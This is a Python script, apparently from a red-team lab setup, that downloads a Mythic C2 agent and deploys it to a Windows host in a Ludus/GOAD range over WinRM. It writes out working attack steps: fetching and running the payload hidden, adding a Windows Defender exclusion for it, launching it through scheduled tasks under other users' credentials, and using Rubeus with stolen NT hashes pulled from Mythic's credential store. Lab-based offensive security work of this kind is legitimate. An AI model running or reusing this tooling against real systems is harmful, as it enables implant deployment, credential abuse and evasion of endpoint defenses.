#!/usr/bin/env python3
"""Download a Mythic payload and launch it on a Ludus Windows host via WinRM.

The GOAD clean-baseline foothold path uses an operator-owned interactive RDP
session plus a scheduled task with LogonType Interactive. That keeps Apollo in
the intended Samwell desktop session without relying on a RAM-backed snapshot.
"""

from __future__ import annotations

import argparse
import asyncio
import functools
import json
import os
from pathlib import Path
import re
import shutil
import ssl
import sys
import threading
import time
from http.server import SimpleHTTPRequestHandler, ThreadingHTTPServer
from typing import Any
from urllib.parse import quote
import urllib.error
import urllib.request

import yaml


REPO_ROOT = Path(__file__).resolve().parents[3]
MYTHIC_ENV_PATH = Path("/home/john/dev/mythic/.env")
DEFAULT_MYTHIC_SERVER = "127.0.0.1"
DEFAULT_MYTHIC_USER = "mythic_admin"
DEFAULT_MCP_PATH = REPO_ROOT / ".mcp.json"
DEFAULT_DOWNLOAD_DIR = Path("/tmp/sage_payloads")
DEFAULT_REMOTE_DIR = r"C:\Users\Public"
DEFAULT_RUBEUS_PATH = REPO_ROOT / "Payload_Type" / "sage" / "tools" / "Rubeus.exe"

PAYLOAD_ATTRS = """
id
uuid
build_phase
build_message
filemetum {
  agent_file_id
  filename_utf8
  id
}
payloadtype { name }
"""

PAYLOADS_QUERY = """
query DeployPayloads($ptype: String!, $limit: Int!) {
  payload(
    where: {payloadtype: {name: {_eq: $ptype}}, deleted: {_eq: false}},
    order_by: {id: desc},
    limit: $limit
  ) {
    id
    uuid
    build_phase
    build_message
    filemetum {
      agent_file_id
      filename_utf8
      id
    }
    payloadtype { name }
  }
}
"""

CALLBACKS_QUERY = """
query DeployCallbacks {
  callback(order_by: {display_id: asc}) {
    display_id
    host
    user
    active
    payload {
      uuid
      payloadtype { name }
    }
  }
}
"""

CREDENTIALS_QUERY = """
query DeployCredentials {
  credential(
    where: {deleted: {_eq: false}},
    order_by: {id: desc},
    limit: 300
  ) {
    id
    account
    realm
    type
    credential_text
    comment
    timestamp
  }
}
"""


class DeployError(RuntimeError):
    """Expected operational failure with a concise message."""


class QuietHTTPRequestHandler(SimpleHTTPRequestHandler):
    def log_message(self, format: str, *args: Any) -> None:  # noqa: A003
        return


def log_phase(phase: str, **details: Any) -> None:
    event = {"phase": phase, **details}
    print(json.dumps(event, sort_keys=True), file=sys.stderr, flush=True)


def resolve_mythic_password(env_path: Path = MYTHIC_ENV_PATH) -> str:
    env_value = os.environ.get("MYTHIC_ADMIN_PASSWORD")
    if env_value:
        return env_value
    if env_path.exists():
        for line in env_path.read_text(encoding="utf-8").splitlines():
            stripped = line.strip()
            if not stripped or stripped.startswith("#") or "=" not in stripped:
                continue
            key, value = stripped.split("=", 1)
            if key.strip() == "MYTHIC_ADMIN_PASSWORD" and value.strip():
                return value.strip().strip("'\"")
    raise DeployError("Set MYTHIC_ADMIN_PASSWORD or provide /home/john/dev/mythic/.env.")


async def mythic_login(args: argparse.Namespace) -> Any:
    from mythic import mythic

    password = args.password or resolve_mythic_password(Path(args.env_path))
    return await mythic.login(server_ip=args.server, username=args.user, password=password)


def payload_filename(payload: dict[str, Any], fallback_uuid: str | None = None) -> str:
    filemetum = payload.get("filemetum")
    if isinstance(filemetum, list):
        filemetum = filemetum[0] if filemetum else None
    if isinstance(filemetum, dict):
        filename = filemetum.get("filename_utf8")
        if filename:
            return Path(str(filename)).name
    filename = payload.get("filename")
    if filename:
        return Path(str(filename)).name
    return f"{fallback_uuid or payload.get('uuid') or 'payload'}.bin"


def payload_summary(payload: dict[str, Any]) -> dict[str, Any]:
    ptype = payload.get("payloadtype") or {}
    return {
        "id": payload.get("id"),
        "uuid": payload.get("uuid"),
        "filename": payload_filename(payload),
        "payload_type": ptype.get("name") if isinstance(ptype, dict) else ptype,
        "build_phase": payload.get("build_phase"),
    }


async def list_payloads(client: Any, payload_type: str, limit: int) -> list[dict[str, Any]]:
    from mythic import mythic

    result = await mythic.execute_custom_query(
        client,
        PAYLOADS_QUERY,
        variables={"ptype": payload_type, "limit": int(limit)},
    )
    rows = result.get("payload", []) if isinstance(result, dict) else []
    return [row for row in rows if isinstance(row, dict)]


async def get_payload(client: Any, args: argparse.Namespace) -> dict[str, Any]:
    from mythic import mythic

    if args.payload_uuid:
        payload = await mythic.get_payload_by_uuid(
            client,
            payload_uuid=args.payload_uuid,
            custom_return_attributes=PAYLOAD_ATTRS,
        )
        if not isinstance(payload, dict) or not payload.get("uuid"):
            raise DeployError(f"Mythic payload not found: {args.payload_uuid}")
        return payload

    payloads = await list_payloads(client, args.payload_type, args.payload_limit)
    for payload in payloads:
        if str(payload.get("build_phase") or "").casefold() == "success":
            return payload
    raise DeployError(f"No successful Mythic payload found for payload type {args.payload_type!r}.")


async def download_payload(client: Any, payload: dict[str, Any], download_dir: Path, output_name: str | None) -> dict[str, Any]:
    from mythic import mythic

    payload_uuid = payload.get("uuid")
    if not payload_uuid:
        raise DeployError("Selected payload has no uuid.")
    download_dir.mkdir(parents=True, exist_ok=True)
    data = await mythic.download_payload(client, payload_uuid=payload_uuid)
    if not data:
        raise DeployError(f"Mythic returned no bytes for payload {payload_uuid}.")
    filename = output_name or payload_filename(payload, str(payload_uuid))
    local_path = download_dir / Path(filename).name
    local_path.write_bytes(data)
    return {"path": str(local_path), "bytes": len(data), "filename": local_path.name}


async def get_callbacks(client: Any) -> list[dict[str, Any]]:
    from mythic import mythic

    result = await mythic.execute_custom_query(client, CALLBACKS_QUERY)
    rows = result.get("callback", []) if isinstance(result, dict) else []
    return [row for row in rows if isinstance(row, dict)]


async def get_credentials(client: Any) -> list[dict[str, Any]]:
    from mythic import mythic

    result = await mythic.execute_custom_query(client, CREDENTIALS_QUERY)
    rows = result.get("credential", []) if isinstance(result, dict) else []
    return [row for row in rows if isinstance(row, dict)]


def normalize_principal(value: str | None) -> str:
    text = str(value or "").strip().casefold()
    return text.replace("/", "\\")


def run_as_account_candidates(run_as_user: str | None, requested: str | None) -> set[str]:
    candidates = {normalize_principal(requested)}
    user = normalize_principal(run_as_user)
    if user:
        candidates.add(user)
        if "\\" in user:
            candidates.add(user.rsplit("\\", 1)[-1])
        if "@" in user:
            candidates.add(user.split("@", 1)[0])
    return {item for item in candidates if item}


def credential_matches(
    credential: dict[str, Any],
    *,
    account_candidates: set[str],
    realm: str | None,
    allowed_types: set[str],
) -> bool:
    ctype = normalize_principal(credential.get("type"))
    if allowed_types and ctype not in allowed_types:
        return False
    secret = str(credential.get("credential_text") or "")
    if not secret:
        return False
    account = normalize_principal(credential.get("account"))
    if account not in account_candidates:
        return False
    expected_realm = normalize_principal(realm)
    if expected_realm:
        actual_realm = normalize_principal(credential.get("realm"))
        if actual_realm != expected_realm:
            return False
    return True


async def resolve_run_as_secret_from_mythic(
    client: Any,
    args: argparse.Namespace,
    *,
    allowed_types_text: str,
    purpose: str,
) -> tuple[str, dict[str, Any]]:
    allowed_types = {
        item.strip().casefold()
        for item in str(allowed_types_text or "").split(",")
        if item.strip()
    }
    account_candidates = run_as_account_candidates(args.run_as_user, args.run_as_credential_account)
    if not account_candidates:
        raise DeployError("--run-as-credential-account or --run-as-user is required for Mythic credential lookup.")

    matches = [
        credential for credential in await get_credentials(client)
        if credential_matches(
            credential,
            account_candidates=account_candidates,
            realm=args.run_as_credential_realm,
            allowed_types=allowed_types,
        )
    ]
    if not matches:
        raise DeployError(
            f"No matching {purpose} credential found in Mythic for "
            f"accounts={sorted(account_candidates)} realm={args.run_as_credential_realm!r}."
        )
    selected = matches[0]
    return str(selected.get("credential_text") or ""), {
        "id": selected.get("id"),
        "account": selected.get("account"),
        "realm": selected.get("realm"),
        "type": selected.get("type"),
    }


async def resolve_run_as_password_from_mythic(client: Any, args: argparse.Namespace) -> tuple[str, dict[str, Any]]:
    return await resolve_run_as_secret_from_mythic(
        client,
        args,
        allowed_types_text=args.run_as_credential_types,
        purpose="plaintext/password",
    )


async def resolve_run_as_hash_from_mythic(client: Any, args: argparse.Namespace) -> tuple[str, dict[str, Any]]:
    return await resolve_run_as_secret_from_mythic(
        client,
        args,
        allowed_types_text=args.run_as_hash_credential_types,
        purpose="hash",
    )


def ludus_creds(mcp_path: Path) -> tuple[str, str]:
    try:
        data = json.loads(mcp_path.read_text(encoding="utf-8"))
    except FileNotFoundError as exc:
        raise DeployError(f"Ludus MCP config not found: {mcp_path}") from exc
    server = (data.get("mcpServers") or data).get("ludus", {})
    env = server.get("env", {})
    url = env.get("LUDUS_URL")
    api_key = env.get("LUDUS_API_KEY")
    if not url or not api_key:
        raise DeployError(f"{mcp_path} does not contain LUDUS_URL and LUDUS_API_KEY for the ludus server.")
    return str(url).rstrip("/"), str(api_key)


def ludus_get(path: str, mcp_path: Path) -> Any:
    url, api_key = ludus_creds(mcp_path)
    request = urllib.request.Request(
        url + path,
        method="GET",
        headers={"X-API-KEY": api_key, "Content-Type": "application/json"},
    )
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    try:
        with urllib.request.urlopen(request, timeout=30, context=ctx) as response:
            raw = response.read().decode("utf-8", errors="replace")
    except urllib.error.HTTPError as exc:
        body = exc.read().decode("utf-8", errors="replace")[:500]
        raise DeployError(f"Ludus API GET {path} failed with HTTP {exc.code}: {body}") from exc
    try:
        return json.loads(raw)
    except json.JSONDecodeError:
        return raw


def extract_inventory_payload(response: Any) -> Any:
    if isinstance(response, dict):
        for key in ("inventory", "ansible_inventory", "result", "data"):
            value = response.get(key)
            if value:
                return value
    return response


def load_ludus_inventory(mcp_path: Path) -> dict[str, dict[str, Any]]:
    response = ludus_get("/api/v2/range/ansibleinventory", mcp_path)
    payload = extract_inventory_payload(response)
    if isinstance(payload, str):
        data = yaml.safe_load(payload)
    else:
        data = payload
    if not isinstance(data, dict):
        raise DeployError("Ludus ansible inventory response was not a mapping.")

    hosts: dict[str, dict[str, Any]] = {}

    def walk(node: Any) -> None:
        if not isinstance(node, dict):
            return
        node_hosts = node.get("hosts")
        if isinstance(node_hosts, dict):
            for name, values in node_hosts.items():
                host_vars = hosts.setdefault(str(name), {"inventory_hostname": str(name)})
                if isinstance(values, dict):
                    host_vars.update(values)
                host_vars["inventory_hostname"] = name
        children = node.get("children")
        if isinstance(children, dict):
            for child in children.values():
                walk(child)
        for key, value in node.items():
            if key not in {"hosts", "children"} and isinstance(value, dict):
                walk(value)

    walk(data.get("all", data))
    meta_hostvars = data.get("_meta", {}).get("hostvars", {}) if isinstance(data.get("_meta"), dict) else {}
    if isinstance(meta_hostvars, dict):
        for name, values in meta_hostvars.items():
            if not isinstance(values, dict):
                continue
            host_vars = hosts.setdefault(str(name), {"inventory_hostname": str(name)})
            host_vars.update(values)
            host_vars.setdefault("inventory_hostname", str(name))
    if not hosts:
        raise DeployError("No hosts found in Ludus ansible inventory.")
    return hosts


def select_ludus_host(args: argparse.Namespace) -> dict[str, Any]:
    hosts = load_ludus_inventory(Path(args.mcp_path))
    if args.ludus_host:
        host = hosts.get(args.ludus_host)
        if not host:
            raise DeployError(f"Ludus host {args.ludus_host!r} not found in inventory.")
        return host

    needles = [value for value in (goad_host_alias(args.target_host), args.target_ip) if value]
    for name, values in hosts.items():
        haystack = " ".join(
            str(value)
            for value in (
                name,
                values.get("inventory_hostname"),
                values.get("ansible_host"),
                values.get("hostname"),
                values.get("name"),
            )
            if value
        ).casefold()
        if all(str(needle).casefold() in haystack for needle in needles):
            return values

    rendered = [
        {"inventory_hostname": name, "ansible_host": values.get("ansible_host")}
        for name, values in sorted(hosts.items())
    ]
    raise DeployError(f"No Ludus inventory host matched {needles!r}. Available hosts: {rendered}")


def goad_host_alias(value: str | None) -> str | None:
    if not value:
        return value
    aliases = {
        "winterfell": "DC01",
        "kingslanding": "DC02",
        "meereen": "DC03",
        "castelblack": "SRV02",
        "braavos": "SRV03",
    }
    return aliases.get(str(value).strip().casefold(), value)


def decode_stream(value: bytes | str | None) -> str:
    if value is None:
        return ""
    if isinstance(value, bytes):
        return value.decode("utf-8", errors="replace")
    return str(value)


def winrm_session(host: dict[str, Any], operation_timeout_sec: int, read_timeout_sec: int) -> Any:
    import winrm

    ansible_host = host.get("ansible_host")
    ansible_user = host.get("ansible_user")
    ansible_password = host.get("ansible_password")
    if not ansible_host or not ansible_user or not ansible_password:
        raise DeployError("Selected Ludus host is missing ansible_host, ansible_user, or ansible_password.")
    endpoint = f"https://{ansible_host}:5986/wsman"
    return winrm.Session(
        endpoint,
        auth=(str(ansible_user), str(ansible_password)),
        transport="ntlm",
        server_cert_validation="ignore",
        operation_timeout_sec=operation_timeout_sec,
        read_timeout_sec=read_timeout_sec,
    )


def run_ps(session: Any, script: str, *, check: bool = True) -> dict[str, Any]:
    result = session.run_ps(script)
    stdout = decode_stream(result.std_out)
    stderr = decode_stream(result.std_err)
    payload = {"status_code": result.status_code, "stdout": stdout.strip(), "stderr": stderr.strip()}
    if check and result.status_code != 0:
        raise DeployError(
            f"PowerShell failed with status {result.status_code}: "
            f"{payload['stderr'] or payload['stdout'] or '<no output>'}"
        )
    return payload


def ps_quote(value: str) -> str:
    return "'" + str(value).replace("'", "''") + "'"


def sanitize_windows_filename(filename: str) -> str:
    name = Path(filename).name
    return re.sub(r"[^A-Za-z0-9._-]", "_", name) or "payload.exe"


def timestamped_remote_name(filename: str) -> str:
    path = Path(sanitize_windows_filename(filename))
    stem = path.stem or "payload"
    suffix = path.suffix or ".exe"
    return f"{stem}_{time.strftime('%Y%m%d%H%M%S')}{suffix}"


def default_remote_filename(filename: str, launch_method: str) -> str:
    sanitized = sanitize_windows_filename(filename)
    if launch_method == "scheduled-task-interactive":
        return sanitized
    return timestamped_remote_name(sanitized)


def windows_join(directory: str, filename: str) -> str:
    return directory.rstrip("\\/") + "\\" + filename.lstrip("\\/")


def start_http_server(directory: Path, bind_host: str, port: int) -> tuple[ThreadingHTTPServer, threading.Thread]:
    handler = functools.partial(QuietHTTPRequestHandler, directory=str(directory))
    server = ThreadingHTTPServer((bind_host, port), handler)
    thread = threading.Thread(target=server.serve_forever, daemon=True)
    thread.start()
    return server, thread


def prepare_served_tool(tool_path: Path, serve_dir: Path) -> Path:
    if not tool_path.exists():
        raise DeployError(f"Required tool not found: {tool_path}")
    destination = serve_dir / tool_path.name
    if not destination.exists() or destination.stat().st_size != tool_path.stat().st_size:
        shutil.copy2(tool_path, destination)
    return destination


def transfer_payload(session: Any, payload_url: str, remote_path: str, timeout_seconds: int) -> dict[str, Any]:
    script = f"""
$ErrorActionPreference = 'Stop'
$ProgressPreference = 'SilentlyContinue'
$target = {ps_quote(remote_path)}
$dir = Split-Path -Parent $target
New-Item -ItemType Directory -Force -Path $dir | Out-Null
Invoke-WebRequest -Uri {ps_quote(payload_url)} -OutFile $target -UseBasicParsing -TimeoutSec {int(timeout_seconds)}
$item = Get-Item -LiteralPath $target
[PSCustomObject]@{{ Path = $item.FullName; Length = $item.Length }} | ConvertTo-Json -Compress
"""
    result = run_ps(session, script)
    parsed = parse_json_object(result["stdout"])
    return parsed or result


def parse_json_object(text: str) -> dict[str, Any] | None:
    if not text:
        return None
    try:
        parsed = json.loads(text.strip())
    except json.JSONDecodeError:
        return None
    return parsed if isinstance(parsed, dict) else None


def launch_current_user(session: Any, remote_path: str) -> dict[str, Any]:
    script = f"""
$ErrorActionPreference = 'Stop'
$p = Start-Process -FilePath {ps_quote(remote_path)} -WindowStyle Hidden -PassThru
[PSCustomObject]@{{ Method = 'current-user'; ProcessId = $p.Id; HasExited = $p.HasExited }} | ConvertTo-Json -Compress
"""
    result = run_ps(session, script)
    return parse_json_object(result["stdout"]) or result


def launch_start_process(session: Any, remote_path: str, run_as_user: str, run_as_password: str) -> dict[str, Any]:
    script = f"""
$ErrorActionPreference = 'Stop'
$sec = ConvertTo-SecureString {ps_quote(run_as_password)} -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential({ps_quote(run_as_user)}, $sec)
$p = Start-Process -FilePath {ps_quote(remote_path)} -Credential $cred -WindowStyle Hidden -PassThru
[PSCustomObject]@{{ Method = 'start-process-credential'; ProcessId = $p.Id; HasExited = $p.HasExited }} | ConvertTo-Json -Compress
"""
    result = run_ps(session, script)
    return parse_json_object(result["stdout"]) or result


def launch_scheduled_task(
    session: Any,
    remote_path: str,
    run_as_user: str,
    run_as_password: str,
    task_name: str | None,
) -> dict[str, Any]:
    task = task_name or f"SagePayload_{time.strftime('%Y%m%d%H%M%S')}"
    script = f"""
$ErrorActionPreference = 'Stop'
$taskName = {ps_quote(task)}
$remotePath = {ps_quote(remote_path)}
$runAsUser = {ps_quote(run_as_user)}
$runAsPassword = {ps_quote(run_as_password)}
$taskRun = '"' + $remotePath + '"'
$startTime = (Get-Date).AddMinutes(1).ToString('HH:mm')
$create = & schtasks.exe /Create /TN $taskName /TR $taskRun /SC ONCE /ST $startTime /RU $runAsUser /RP $runAsPassword /F 2>&1 | Out-String
if ($LASTEXITCODE -ne 0) {{ throw "schtasks create failed: $create" }}
$run = & schtasks.exe /Run /TN $taskName 2>&1 | Out-String
if ($LASTEXITCODE -ne 0) {{ throw "schtasks run failed: $run" }}
Start-Sleep -Seconds 2
$query = & schtasks.exe /Query /TN $taskName /V /FO LIST 2>&1 | Out-String
[PSCustomObject]@{{ Method = 'scheduled-task'; TaskName = $taskName; Create = $create.Trim(); Run = $run.Trim(); Query = $query.Trim() }} | ConvertTo-Json -Compress
"""
    result = run_ps(session, script)
    return parse_json_object(result["stdout"]) or result


def launch_scheduled_task_s4u(
    session: Any,
    remote_path: str,
    run_as_user: str,
    task_name: str | None,
) -> dict[str, Any]:
    task = task_name or f"SagePayloadS4U_{time.strftime('%Y%m%d%H%M%S')}"
    script = f"""
$ErrorActionPreference = 'Stop'
$taskName = {ps_quote(task)}
$remotePath = {ps_quote(remote_path)}
$runAsUser = {ps_quote(run_as_user)}
$action = New-ScheduledTaskAction -Execute $remotePath
$trigger = New-ScheduledTaskTrigger -Once -At (Get-Date).AddMinutes(1)
$principal = New-ScheduledTaskPrincipal -UserId $runAsUser -LogonType S4U -RunLevel Limited
$task = New-ScheduledTask -Action $action -Trigger $trigger -Principal $principal
Register-ScheduledTask -TaskName $taskName -InputObject $task -Force | Out-Null
Start-ScheduledTask -TaskName $taskName
Start-Sleep -Seconds 2
$info = Get-ScheduledTaskInfo -TaskName $taskName
$registered = Get-ScheduledTask -TaskName $taskName
[PSCustomObject]@{{
  Method = 'scheduled-task-s4u'
  TaskName = $taskName
  State = $registered.State
  LastTaskResult = $info.LastTaskResult
  LastRunTime = $info.LastRunTime
  NextRunTime = $info.NextRunTime
}} | ConvertTo-Json -Compress
"""
    result = run_ps(session, script)
    return parse_json_object(result["stdout"]) or result


def find_active_interactive_session(output: str, run_as_user: str) -> dict[str, str] | None:
    short_user = run_as_short_user(run_as_user).casefold()
    if not short_user:
        return None
    for raw_line in str(output or "").splitlines():
        line = raw_line.lstrip(">").strip()
        if not line or line.casefold().startswith("username"):
            continue
        tokens = line.split()
        if not tokens or tokens[0].casefold() != short_user:
            continue
        for index, token in enumerate(tokens[1:], start=1):
            if token.casefold() != "active":
                continue
            session_id = tokens[index - 1] if index > 0 else ""
            if session_id.isdigit():
                return {"user": tokens[0], "session_id": session_id, "line": line}
    return None


def query_user_sessions(session: Any) -> dict[str, Any]:
    result = run_ps(session, "quser 2>&1 | Out-String", check=False)
    output = result.get("stdout") or result.get("stderr") or ""
    return {"output": output, "status_code": result.get("status_code")}


def wait_for_active_interactive_session(
    session: Any,
    run_as_user: str,
    *,
    timeout_seconds: int,
    poll_interval: float,
) -> dict[str, Any]:
    deadline = time.monotonic() + max(0, timeout_seconds)
    latest = {"output": "", "status_code": None}
    while True:
        latest = query_user_sessions(session)
        match = find_active_interactive_session(latest.get("output", ""), run_as_user)
        if match:
            return {
                "run_as_user": run_as_user,
                "matched_user": match["user"],
                "session_id": match["session_id"],
                "session_line": match["line"],
                "quser_output": latest["output"],
            }
        if time.monotonic() >= deadline:
            raise DeployError(
                f"No active interactive session found for {run_as_user!r} within {timeout_seconds}s. "
                f"Open and keep an RDP session active before using scheduled-task-interactive. "
                f"Last quser output: {latest.get('output')!r}"
            )
        time.sleep(max(0.25, poll_interval))


def launch_scheduled_task_interactive(
    session: Any,
    remote_path: str,
    run_as_user: str,
    task_name: str | None,
) -> dict[str, Any]:
    task = task_name or f"SagePayloadInteractive_{time.strftime('%Y%m%d%H%M%S')}"
    script = f"""
$ErrorActionPreference = 'Stop'
$taskName = {ps_quote(task)}
$remotePath = {ps_quote(remote_path)}
$runAsUser = {ps_quote(run_as_user)}
$action = New-ScheduledTaskAction -Execute $remotePath
$trigger = New-ScheduledTaskTrigger -Once -At (Get-Date).AddMinutes(1)
$principal = New-ScheduledTaskPrincipal -UserId $runAsUser -LogonType Interactive -RunLevel Limited
$task = New-ScheduledTask -Action $action -Trigger $trigger -Principal $principal
Register-ScheduledTask -TaskName $taskName -InputObject $task -Force | Out-Null
Start-ScheduledTask -TaskName $taskName
Start-Sleep -Seconds 2
$info = Get-ScheduledTaskInfo -TaskName $taskName
$registered = Get-ScheduledTask -TaskName $taskName
[PSCustomObject]@{{
  Method = 'scheduled-task-interactive'
  TaskName = $taskName
  State = $registered.State.ToString()
  LastTaskResult = $info.LastTaskResult
  LastRunTime = $info.LastRunTime
}} | ConvertTo-Json -Compress
"""
    result = run_ps(session, script)
    return parse_json_object(result["stdout"]) or result


def disconnect_interactive_session(session: Any, session_id: str) -> dict[str, Any]:
    script = f"""
$ErrorActionPreference = 'Stop'
$sessionId = {ps_quote(str(session_id))}
$before = quser 2>&1 | Out-String
& "$env:SystemRoot\\System32\\tsdiscon.exe" $sessionId
if ($LASTEXITCODE -ne 0) {{
  throw "tsdiscon failed for session $sessionId with exit code $LASTEXITCODE"
}}
Start-Sleep -Seconds 1
$after = quser 2>&1 | Out-String
[PSCustomObject]@{{
  Method = 'tsdiscon'
  SessionId = $sessionId
  Before = $before.Trim()
  After = $after.Trim()
}} | ConvertTo-Json -Compress
"""
    result = run_ps(session, script)
    return parse_json_object(result["stdout"]) or result


def maybe_disconnect_interactive_session(
    session: Any,
    args: argparse.Namespace,
    launch: dict[str, Any],
    new_callbacks: list[dict[str, Any]],
) -> dict[str, Any] | None:
    if args.launch_method != "scheduled-task-interactive" or not getattr(args, "disconnect_interactive_session", True):
        return None
    if not new_callbacks:
        return {"skipped": True, "reason": "no-new-callback-observed"}
    session_id = str((launch.get("interactive_session") or {}).get("session_id") or "").strip()
    if not session_id:
        raise DeployError("Interactive launch did not report a session ID for post-callback disconnect.")
    return disconnect_interactive_session(session, session_id)


def ensure_defender_exclusion(session: Any, remote_path: str) -> dict[str, Any]:
    script = f"""
$ErrorActionPreference = 'Stop'
$path = {ps_quote(remote_path)}
$before = @((Get-MpPreference).ExclusionPath | Where-Object {{ $_ }})
$alreadyPresent = $before -contains $path
if (-not $alreadyPresent) {{
  Add-MpPreference -ExclusionPath $path
}}
$after = @((Get-MpPreference).ExclusionPath | Where-Object {{ $_ }})
[PSCustomObject]@{{
  Method = 'defender-exclusion-path'
  Path = $path
  AlreadyPresent = $alreadyPresent
  PresentAfter = ($after -contains $path)
  ExclusionPath = $after
}} | ConvertTo-Json -Compress
"""
    result = run_ps(session, script)
    parsed = parse_json_object(result["stdout"]) or result
    if not parsed.get("PresentAfter"):
        raise DeployError(f"Defender exclusion was not present after Add-MpPreference for {remote_path!r}.")
    return parsed


def run_as_short_user(run_as_user: str) -> str:
    user = str(run_as_user or "").strip()
    if "\\" in user:
        return user.rsplit("\\", 1)[-1]
    if "@" in user:
        return user.split("@", 1)[0]
    return user


def redact_secret(text: str, secret: str) -> str:
    if not text or not secret:
        return text
    return text.replace(secret, "<redacted>")


def redact_rubeus_output(text: str, secret: str) -> str:
    redacted = redact_secret(text, secret)
    redacted = re.sub(r"(?m)^\s*[A-Za-z0-9+/]{120,}={0,2}\s*$", "<redacted-base64-line>", redacted)
    if len(redacted) > 4000:
        redacted = redacted[:4000] + "\n<truncated>"
    return redacted


def launch_rubeus_asktgt_netonly(
    session: Any,
    *,
    remote_payload_path: str,
    remote_rubeus_path: str,
    run_as_user: str,
    domain: str,
    nt_hash: str,
    dc: str | None,
    timeout_seconds: int,
) -> dict[str, Any]:
    user = run_as_short_user(run_as_user)
    if not user or not domain or not nt_hash:
        raise DeployError("Rubeus netonly launch requires run-as user, domain, and NT hash.")
    dc_arg = f" /dc:{dc}" if dc else ""
    rubeus_args = (
        f"asktgt /user:{user} /domain:{domain} /rc4:{nt_hash}"
        f"{dc_arg} /createnetonly:\"{remote_payload_path}\" /ptt /nowrap"
    )
    script = f"""
$ErrorActionPreference = 'Stop'
$rubeus = {ps_quote(remote_rubeus_path)}
$arguments = {ps_quote(rubeus_args)}
$outPath = "$env:TEMP\\sage_rubeus_out.txt"
$errPath = "$env:TEMP\\sage_rubeus_err.txt"
Remove-Item -LiteralPath $outPath,$errPath -Force -ErrorAction SilentlyContinue
$p = Start-Process -FilePath $rubeus -ArgumentList $arguments -WindowStyle Hidden -PassThru -RedirectStandardOutput $outPath -RedirectStandardError $errPath
$exited = Wait-Process -Id $p.Id -Timeout {int(timeout_seconds)} -ErrorAction SilentlyContinue
$timedOut = $false
if ($null -eq $exited -and -not $p.HasExited) {{
  $timedOut = $true
  Stop-Process -Id $p.Id -Force -ErrorAction SilentlyContinue
  Start-Sleep -Seconds 1
}}
$stdout = Get-Content -LiteralPath "$env:TEMP\\sage_rubeus_out.txt" -Raw -ErrorAction SilentlyContinue
$stderr = Get-Content -LiteralPath "$env:TEMP\\sage_rubeus_err.txt" -Raw -ErrorAction SilentlyContinue
[PSCustomObject]@{{
  Method = 'rubeus-asktgt-netonly'
  ExitCode = $p.ExitCode
  TimedOut = $timedOut
  Stdout = $stdout
  Stderr = $stderr
}} | ConvertTo-Json -Compress
"""
    result = run_ps(session, script)
    parsed = parse_json_object(result["stdout"]) or result
    if "Stdout" in parsed:
        parsed["Stdout"] = redact_rubeus_output(str(parsed["Stdout"]), nt_hash)
    if "Stderr" in parsed:
        parsed["Stderr"] = redact_rubeus_output(str(parsed["Stderr"]), nt_hash)
    if parsed.get("ExitCode") not in (0, None):
        raise DeployError(
            "Rubeus netonly launch failed: "
            f"exit={parsed.get('ExitCode')} stderr={str(parsed.get('Stderr') or '')[:500]} "
            f"stdout={str(parsed.get('Stdout') or '')[:500]}"
        )
    return parsed


def resolve_run_as_password(args: argparse.Namespace) -> str | None:
    resolved = getattr(args, "_resolved_run_as_password", None)
    if resolved:
        return resolved
    if args.run_as_password:
        return args.run_as_password
    if args.run_as_password_env:
        return os.environ.get(args.run_as_password_env)
    return None


def launch_payload(session: Any, remote_path: str, args: argparse.Namespace) -> dict[str, Any]:
    method = args.launch_method
    if not args.run_as_user:
        if method not in {"auto", "current-user"}:
            raise DeployError(f"--launch-method {method} requires --run-as-user.")
        return launch_current_user(session, remote_path)

    password = resolve_run_as_password(args)
    if method == "rubeus-asktgt-netonly":
        nt_hash = getattr(args, "_resolved_run_as_hash", None)
        if not nt_hash:
            raise DeployError("Rubeus netonly launch requires a resolved run-as hash.")
        return launch_rubeus_asktgt_netonly(
            session,
            remote_payload_path=remote_path,
            remote_rubeus_path=args._remote_rubeus_path,
            run_as_user=args.run_as_user,
            domain=args.run_as_domain or args.run_as_credential_realm,
            nt_hash=nt_hash,
            dc=args.run_as_dc,
            timeout_seconds=args.rubeus_timeout_seconds,
        )
    if method == "scheduled-task-s4u":
        return launch_scheduled_task_s4u(session, remote_path, args.run_as_user, args.task_name)
    if method == "scheduled-task-interactive":
        session_info = wait_for_active_interactive_session(
            session,
            args.run_as_user,
            timeout_seconds=args.wait_interactive_session_seconds,
            poll_interval=args.poll_interval,
        )
        result = launch_scheduled_task_interactive(session, remote_path, args.run_as_user, args.task_name)
        result["interactive_session"] = session_info
        return result
    if not password:
        if method == "auto" and args.allow_s4u_task:
            result = launch_scheduled_task_s4u(session, remote_path, args.run_as_user, args.task_name)
            result["fallback_used"] = True
            result["fallback_reason"] = "no plaintext run-as password; used scheduled-task-s4u"
            return result
        raise DeployError(
            f"--run-as-user requires --run-as-password, environment variable {args.run_as_password_env}, "
            "--launch-method scheduled-task-s4u, --launch-method scheduled-task-interactive, or --allow-s4u-task."
        )

    if method == "start-process":
        return launch_start_process(session, remote_path, args.run_as_user, password)
    if method == "scheduled-task":
        return launch_scheduled_task(session, remote_path, args.run_as_user, password, args.task_name)
    if method != "auto":
        raise DeployError(f"Unsupported launch method: {method}")

    try:
        result = launch_start_process(session, remote_path, args.run_as_user, password)
        result["fallback_used"] = False
        return result
    except DeployError as exc:
        result = launch_scheduled_task(session, remote_path, args.run_as_user, password, args.task_name)
        result["fallback_used"] = True
        result["start_process_error"] = str(exc)[:500]
        return result


def callback_identity(callback: dict[str, Any]) -> dict[str, Any]:
    payload = callback.get("payload") or {}
    ptype = payload.get("payloadtype") or {}
    return {
        "display_id": callback.get("display_id"),
        "host": callback.get("host"),
        "user": callback.get("user"),
        "active": callback.get("active"),
        "payload_type": ptype.get("name") if isinstance(ptype, dict) else ptype,
        "payload_uuid": payload.get("uuid") if isinstance(payload, dict) else None,
    }


async def wait_for_new_callbacks(
    client: Any,
    before_ids: set[int],
    payload_type: str,
    seconds: int,
    poll_interval: float,
) -> tuple[list[dict[str, Any]], list[dict[str, Any]]]:
    deadline = time.monotonic() + max(0, seconds)
    latest = await get_callbacks(client)
    while time.monotonic() <= deadline:
        new_rows = [
            row for row in latest
            if isinstance(row.get("display_id"), int)
            and row["display_id"] not in before_ids
            and str(((row.get("payload") or {}).get("payloadtype") or {}).get("name") or "").casefold()
            == payload_type.casefold()
        ]
        if new_rows or seconds <= 0:
            return latest, new_rows
        await asyncio.sleep(poll_interval)
        latest = await get_callbacks(client)
    return latest, []


